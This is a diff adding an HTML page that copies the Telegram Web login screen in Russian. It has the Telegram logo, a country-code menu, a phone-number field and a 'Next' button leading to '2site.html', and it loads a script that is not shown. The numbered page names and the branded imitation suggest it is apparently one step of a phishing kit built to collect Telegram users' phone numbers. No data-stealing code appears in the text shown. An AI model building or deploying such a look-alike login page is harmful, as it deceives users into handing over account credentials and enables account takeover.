@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" sizes="192x192" href="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
+  <title>Telegram Web</title>
+
+ <link rel="stylesheet" href="1site/styles.css">
+
+ </head>
+<body>
+  <div class="container">
+    <div id="phone-step">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+      <h1>Telegram</h1>
+
+      <p class="note">Проверьте код страны и введите свой номер телефона.</p>
+
+      <form id="phone-form">
+        <div class="input-group">
+          <label for="country">Страна</label>
+          <!-- Селектор страны -->
+          <div class="phone-code-selector" onclick="toggleMenu()" tabindex="0">
+            <span id="selected-country">Россия (+7)</span>
+            <span>&#9660;</span> <!-- Стрелка вниз -->
+          </div>
+          
+          <!-- Меню выбора страны -->
+          <div role="presentation" class="bubble menu-container custom-scroll opacity-transition fast left top shown open" id="country-menu">
+
+
+<div class="menu-item" data-code="+1">
+  <span class="flag">🇺🇸</span>
+  <span class="country-name">США</span>
+  <span class="country-code">(+1)</span>
+</div>
+<div class="menu-item" data-code="+1">
+  <span class="flag">🇨🇦</span>
+  <span class="country-name">Канада</span>
+  <span class="country-code">(+1)</span>
+</div>
+<div class="menu-item" data-code="+7">
+  <span class="flag">🇷🇺</span>
+  <span class="country-name">Россия</span>
+  <span class="country-code">(+7)</span>
+</div>
+<div class="menu-item" data-code="+374">
+  <span class="flag">🇦🇲</span>
+  <span class="country-name">Армения</span>
+  <span class="country-code">(+374)</span>
+</div>
+<div class="menu-item" data-code="+994">
+  <span class="flag">🇦🇿</span>
+  <span class="country-name">Азербайджан</span>
+  <span class="country-code">(+994)</span>
+</div>
+<div class="menu-item" data-code="+375">
+  <span class="flag">🇧🇾</span>
+  <span class="country-name">Беларусь</span>
+  <span class="country-code">(+375)</span>
+</div>
+<div class="menu-item" data-code="+995">
+  <span class="flag">🇬🇪</span>
+  <span class="country-name">Грузия</span>
+  <span class="country-code">(+995)</span>
+</div>
+<div class="menu-item" data-code="+7">
+  <span class="flag">🇰🇿</span>
+  <span class="country-name">Казахстан</span>
+  <span class="country-code">(+7)</span>
+</div>
+<div class="menu-item" data-code="+996">
+  <span class="flag">🇰🇬</span>
+  <span class="country-name">Кыргызстан</span>
+  <span class="country-code">(+996)</span>
+</div>
+<div class="menu-item" data-code="+373">
+  <span class="flag">🇲🇩</span>
+  <span class="country-name">Молдова</span>
+  <span class="country-code">(+373)</span>
+</div>
+<div class="menu-item" data-code="+992">
+  <span class="flag">🇹🇯</span>
+  <span class="country-name">Таджикистан</span>
+  <span class="country-code">(+992)</span>
+</div>
+<div class="menu-item" data-code="+993">
+  <span class="flag">🇹🇲</span>
+  <span class="country-name">Туркменистан</span>
+  <span class="country-code">(+993)</span>
+</div>
+<div class="menu-item" data-code="+998">
+  <span class="flag">🇺🇿</span>
+  <span class="country-name">Узбекистан</span>
+  <span class="country-code">(+998)</span>
+</div>
+<div class="menu-item" data-code="+380">
+  <span class="flag">🇺🇦</span>
+  <span class="country-name">Украина</span>
+  <span class="country-code">(+380)</span>
+</div>
+<div class="menu-item" data-code="+44">
+  <span class="flag">🇬🇧</span>
+  <span class="country-name">Великобритания</span>
+  <span class="country-code">(+44)</span>
+</div>
+<div class="menu-item" data-code="+49">
+  <span class="flag">🇩🇪</span>
+  <span class="country-name">Германия</span>
+  <span class="country-code">(+49)</span>
+</div>
+<div class="menu-item" data-code="+33">
+  <span class="flag">🇫🇷</span>
+  <span class="country-name">Франция</span>
+  <span class="country-code">(+33)</span>
+</div>
+<div class="menu-item" data-code="+39">
+  <span class="flag">🇮🇹</span>
+  <span class="country-name">Италия</span>
+  <span class="country-code">(+39)</span>
+</div>
+<div class="menu-item" data-code="+34">
+  <span class="flag">🇪🇸</span>
+  <span class="country-name">Испания</span>
+  <span class="country-code">(+34)</span>
+</div>
+<div class="menu-item" data-code="+81">
+  <span class="flag">🇯🇵</span>
+  <span class="country-name">Япония</span>
+  <span class="country-code">(+81)</span>
+</div>
+<div class="menu-item" data-code="+82">
+  <span class="flag">🇰🇷</span>
+  <span class="country-name">Южная Корея</span>
+  <span class="country-code">(+82)</span>
+</div>
+<div class="menu-item" data-code="+91">
+  <span class="flag">🇮🇳</span>
+  <span class="country-name">Индия</span>
+  <span class="country-code">(+91)</span>
+</div>
+<div class="menu-item" data-code="+86">
+  <span class="flag">🇨🇳</span>
+  <span class="country-name">Китай</span>
+  <span class="country-code">(+86)</span>
+</div>
+<div class="menu-item" data-code="+55">
+  <span class="flag">🇧🇷</span>
+  <span class="country-name">Бразилия</span>
+  <span class="country-code">(+55)</span>
+</div>
+<div class="menu-item" data-code="+52">
+  <span class="flag">🇲🇽</span>
+  <span class="country-name">Мексика</span>
+  <span class="country-code">(+52)</span>
+</div>
+<div class="menu-item" data-code="+54">
+  <span class="flag">🇦🇷</span>
+  <span class="country-name">Аргентина</span>
+  <span class="country-code">(+54)</span>
+</div>
+<div class="menu-item" data-code="+27">
+  <span class="flag">🇿🇦</span>
+  <span class="country-name">Южноафриканская Республика</span>
+  <span class="country-code">(+27)</span>
+</div>
+<div class="menu-item" data-code="+61">
+  <span class="flag">🇦🇺</span>
+  <span class="country-name">Австралия</span>
+  <span class="country-code">(+61)</span>
+</div>
+<div class="menu-item" data-code="+64">
+  <span class="flag">🇳🇿</span>
+  <span class="country-name">Новая Зеландия</span>
+  <span class="country-code">(+64)</span>
+</div>
+<div class="menu-item" data-code="+41">
+  <span class="flag">🇨🇭</span>
+  <span class="country-name">Швейцария</span>
+  <span class="country-code">(+41)</span>
+</div>
+<div class="menu-item" data-code="+46">
+  <span class="flag">🇸🇪</span>
+  <span class="country-name">Швеция</span>
+  <span class="country-code">(+46)</span>
+</div>
+<div class="menu-item" data-code="+45">
+  <span class="flag">🇩🇰</span>
+  <span class="country-name">Дания</span>
+  <span class="country-code">(+45)</span>
+</div>
+<div class="menu-item" data-code="+63">
+  <span class="flag">🇵🇭</span>
+  <span class="country-name">Филиппины</span>
+  <span class="country-code">(+63)</span>
+</div>
+<div class="menu-item" data-code="+31">
+  <span class="flag">🇳🇱</span>
+  <span class="country-name">Нидерланды</span>
+  <span class="country-code">(+31)</span>
+</div>
+<div class="menu-item" data-code="+48">
+  <span class="flag">🇵🇱</span>
+  <span class="country-name">Польша</span>
+  <span class="country-code">(+48)</span>
+</div>
+<div class="menu-item" data-code="+65">
+  <span class="flag">🇸🇬</span>
+  <span class="country-name">Сингапур</span>
+  <span class="country-code">(+65)</span>
+</div>
+<div class="menu-item" data-code="+66">
+  <span class="flag">🇹🇭</span>
+  <span class="country-name">Таиланд</span>
+  <span class="country-code">(+66)</span>
+</div>
+<div class="menu-item" data-code="+84">
+  <span class="flag">🇻🇳</span>
+  <span class="country-name">Вьетнам</span>
+  <span class="country-code">(+84)</span>
+</div>
+<div class="menu-item" data-code="+62">
+  <span class="flag">🇮🇩</span>
+  <span class="country-name">Индонезия</span>
+  <span class="country-code">(+62)</span>
+</div>
+<div class="menu-item" data-code="+60">
+  <span class="flag">🇲🇾</span>
+  <span class="country-name">Малайзия</span>
+  <span class="country-code">(+60)</span>
+</div>
+<div class="menu-item" data-code="+961">
+  <span class="flag">🇱🇧</span>
+  <span class="country-name">Ливан</span>
+  <span class="country-code">(+961)</span>
+</div>
+<div class="menu-item" data-code="+967">
+  <span class="flag">🇾🇪</span>
+  <span class="country-name">Йемен</span>
+  <span class="country-code">(+967)</span>
+</div>
+<div class="menu-item" data-code="+964">
+  <span class="flag">🇮🇶</span>
+  <span class="country-name">Ирак</span>
+  <span class="country-code">(+964)</span>
+</div>
+<div class="menu-item" data-code="+98">
+  <span class="flag">🇮🇷</span>
+  <span class="country-name">Иран</span>
+  <span class="country-code">(+98)</span>
+</div>
+<div class="menu-item" data-code="+963">
+  <span class="flag">🇸🇾</span>
+  <span class="country-name">Сирия</span>
+  <span class="country-code">(+963)</span>
+</div>
+<div class="menu-item" data-code="+218">
+  <span class="flag">🇱🇾</span>
+  <span class="country-name">Ливия</span>
+  <span class="country-code">(+218)</span>
+</div>
+<div class="menu-item" data-code="+20">
+  <span class="flag">🇪🇬</span>
+  <span class="country-name">Египет</span>
+  <span class="country-code">(+20)</span>
+</div>
+<div class="menu-item" data-code="+216">
+  <span class="flag">🇹🇳</span>
+  <span class="country-name">Тунис</span>
+  <span class="country-code">(+216)</span>
+</div>
+<div class="menu-item" data-code="+213">
+  <span class="flag">🇩🇿</span>
+  <span class="country-name">Алжир</span>
+  <span class="country-code">(+213)</span>
+</div>
+<div class="menu-item" data-code="+212">
+  <span class="flag">🇲🇦</span>
+  <span class="country-name">Марокко</span>
+  <span class="country-code">(+212)</span>
+</div>
+<div class="menu-item" data-code="+249">
+  <span class="flag">🇸🇩</span>
+  <span class="country-name">Судан</span>
+  <span class="country-code">(+249)</span>
+</div>
+<div class="menu-item" data-code="+230">
+  <span class="flag">🇲🇺</span>
+  <span class="country-name">Маврикий</span>
+  <span class="country-code">(+230)</span>
+</div>
+<div class="menu-item" data-code="+248">
+  <span class="flag">🇸🇨</span>
+  <span class="country-name">Сейшельские острова</span>
+  <span class="country-code">(+248)</span>
+</div>
+<div class="menu-item" data-code="+254">
+  <span class="flag">🇰🇪</span>
+  <span class="country-name">Кения</span>
+  <span class="country-code">(+254)</span>
+</div>
+<div class="menu-item" data-code="+234">
+  <span class="flag">🇳🇬</span>
+  <span class="country-name">Нигерия</span>
+  <span class="country-code">(+234)</span>
+</div>
+<div class="menu-item" data-code="+237">
+  <span class="flag">🇨🇲</span>
+  <span class="country-name">Камерун</span>
+  <span class="country-code">(+237)</span>
+</div>
+<div class="menu-item" data-code="+251">
+  <span class="flag">🇪🇹</span>
+  <span class="country-name">Эфиопия</span>
+  <span class="country-code">(+251)</span>
+</div>
+<div class="menu-item" data-code="+256">
+  <span class="flag">🇺🇬</span>
+  <span class="country-name">Уганда</span>
+  <span class="country-code">(+256)</span>
+</div>
+<div class="menu-item" data-code="+233">
+  <span class="flag">🇬🇭</span>
+  <span class="country-name">Гана</span>
+  <span class="country-code">(+233)</span>
+</div>
+<div class="menu-item" data-code="+255">
+  <span class="flag">🇹🇿</span>
+  <span class="country-name">Танзания</span>
+  <span class="country-code">(+255)</span>
+</div>
+<div class="menu-item" data-code="+250">
+  <span class="flag">🇷🇼</span>
+  <span class="country-name">Руанда</span>
+  <span class="country-code">(+250)</span>
+</div>
+<div class="menu-item" data-code="+257">
+  <span class="flag">🇧🇮</span>
+  <span class="country-name">Бурунди</span>
+  <span class="country-code">(+257)</span>
+</div>
+<div class="menu-item" data-code="+260">
+  <span class="flag">🇿🇲</span>
+  <span class="country-name">Замбия</span>
+  <span class="country-code">(+260)</span>
+</div>
+<div class="menu-item" data-code="+263">
+  <span class="flag">🇿🇼</span>
+  <span class="country-name">Зимбабве</span>
+  <span class="country-code">(+263)</span>
+</div>
+
+
+
+
+          </div>
+        </div>
+
+
+
+
+        <div class="input-group">
+ 	 <input type="tel" id="phone" name="phone">
+ 	 <label for="phone">Номер телефона</label>
+	</div>
+
+	<label class="Checkbox">
+  <input type="checkbox" id="sign-in-keep-session">
+  <div class="Checkbox-main">
+    <span dir="auto">Keep me signed in</span>
+  </div>
+</label>
+
+     </form>
+    </div>
+
+	<a href="2site.html">
+  <button type="submit" class="Button default primary has-ripple">
+    Далее
+    <div class="ripple-container"></div>
+  </button>
+</a>
+
+
+  </div>
+
+<script src="1site/script.js"></script>
+
+</body>
+</html>
